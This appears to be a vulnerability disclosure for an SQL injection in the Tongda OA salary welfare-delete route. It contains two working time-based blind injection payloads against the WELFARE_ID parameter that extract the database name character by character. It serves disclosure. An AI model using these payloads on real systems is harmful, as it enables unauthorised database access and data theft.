SQL injection vulnerability exists in Tongda OA v2017 and later versions 11.10

verison:v2017 and v11.10 or later

1.

Routing: general/hr/salary/welfare_manage/delete PHP

There is an injected parameter: $WELFARE_ID

The code here is neat, concatenating the parameter directly into the SQL statement when the $WELFARE_ID is not empty, which is bypassed because the parentheses are closed.

![图片1](https://github.com/RCEraser/cve/assets/131632691/dde9b679-4bb9-4061-917a-4250db54c4c5)

2.Payload

We can use Cartesian product blind injection, the following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. ascii 116 also corresponds to the lowercase letter t. In this way, the database name and any database information can be obtained through blind injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![图片2](https://github.com/RCEraser/cve/assets/131632691/c762a965-9a50-4ff3-acd3-dc9ce983ab90)

And we're going to change 116 to 115 so there's no delay, so there's SQL injection.

```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![图片3](https://github.com/RCEraser/cve/assets/131632691/babef685-deca-428f-8adc-ad8630cc8aab)
